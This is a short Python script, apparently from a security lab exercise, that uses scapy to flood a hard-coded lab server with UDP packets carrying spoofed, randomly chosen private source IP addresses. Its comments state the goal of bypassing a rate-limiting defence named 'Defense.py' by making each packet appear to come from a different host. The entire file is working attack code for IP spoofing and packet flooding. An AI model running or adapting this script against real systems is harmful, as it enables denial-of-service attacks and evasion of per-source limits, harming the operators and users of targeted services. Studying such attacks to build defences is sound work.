from scapy.all import *
from scapy.layers.inet import UDP, IP
message = input("Enter the message to send: ")
iterations = int(input("Enter the number of times to execute the attack: "))
i = 0
#Will create enough IP addresses using private IP prefixes to bypass Defense.py
source_ips=[]
for w in range(255):
    for k in range(255):
        for l in range(255):
            ip_address = f"192.168.{k}.{l}"
            ip_address1 = f"10.{w}.{k}.{l}"
            if (w>=16) & (w<=31):
                ip_address2 = f"172.{w}.{k}.{l}"
                source_ips.append(ip_address2)
            source_ips.append(ip_address)
            source_ips.append(ip_address1)

while (i <= iterations):
    # Server IP and port
    server_ip = '192.168.180.128'  # Replace with the actual server IP
    server_port = 12345  # Replace with the actual server port

    # Choose a random source IP address
    source_ip = random.choice(source_ips)

    #Make sure source_ip and server_ip don't coincide in order to bypass the maximum number of packets allowed
    if (source_ip == server_ip):
        continue

    if message.lower() == 'exit':
        break

    # Create a UDP packet with a randomized source IP
    udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / message

    # Send the packet
    send(udp_packet)
    i+=1

# Close the socket
print("Executed the attack for ", iterations, "time(s)")